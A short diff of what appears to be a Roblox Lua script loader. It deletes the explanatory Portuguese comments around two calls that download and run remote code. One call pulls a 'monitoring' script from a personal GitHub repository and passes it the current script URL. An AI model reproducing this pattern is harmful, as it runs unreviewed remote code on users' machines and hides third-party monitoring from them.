@@ -23,14 +23,14 @@ local S = {
 
 local U = S[G]
 if U then
-    -- Passa o link do script atual para o monitoramento ler
+    
     shared.ScriptUrl = U
 
-    -- Executa o seu script de monitoramento do GitHub RAW de forma segura
+    
     pcall(function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/mighuelfreitas40-sys/monitoramento/refs/heads/main/monitoramento"))()
     end)
 
-    -- Executa o script original do jogo
+    
     loadstring(game:HttpGet(U))()
 end
